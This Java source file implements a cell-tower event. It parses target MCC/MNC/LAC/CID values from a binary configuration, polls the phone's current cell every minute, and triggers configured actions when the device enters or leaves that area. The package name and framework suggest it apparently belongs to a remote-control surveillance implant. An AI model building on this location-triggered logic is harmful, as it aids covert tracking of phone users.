package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.content.Context;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

import com.ht.RCSAndroidGUI.CellInfo;
import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;

public class CellIdEvent extends EventBase {
	private static final String TAG = null;

	private static final long CELLID_PERIOD = 60000;
	private static final long CELLID_DELAY = 1000;

	int actionOnEnter;
	int actionOnExit;

	int mccOrig;
	int mncOrig;
	int lacOrig;
	int cidOrig;
	boolean entered = false;

	@Override
	public void begin() {
		entered = false;
	}

	@Override
	public void end() {
	}

	@Override
	public boolean parse(EventConf event) {
		byte[] confParams = event.getParams();
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length);

		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();

			mccOrig = databuffer.readInt();
			mncOrig = databuffer.readInt();
			lacOrig = databuffer.readInt();
			cidOrig = databuffer.readInt();

			Log.d("QZ", TAG + " Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
					+ lacOrig + " Cid: " + cidOrig);

			setPeriod(CELLID_PERIOD);
			setDelay(CELLID_DELAY);

		} catch (final IOException e) {
			return false;
		}

		return true;
	}

	@Override
	public void go() {
		CellInfo info = Device.getCellInfo();
		if(!info.valid){
			Log.d("QZ", TAG + " Error: " + "invalid cell info" );
			return;
		}
		
		if ((mccOrig == -1 || mccOrig == info.mcc)
				&& (mncOrig == -1 || mncOrig == info.mnc)
				&& (lacOrig == -1 || lacOrig == info.lac)
				&& (cidOrig == -1 || cidOrig == info.cid)) {
			if (!entered) {
				Log.d("QZ", TAG + " Enter");
				entered = true;
				trigger(actionOnEnter);
			} else {
				Log.d("QZ", TAG + " already entered");
			}

		} else {
			if (entered) {
				Log.d("QZ", TAG + " Exit");
				entered = false;
				trigger(actionOnExit);
			} else {
				Log.d("QZ", TAG + " already exited");
			}
		}
	}

}
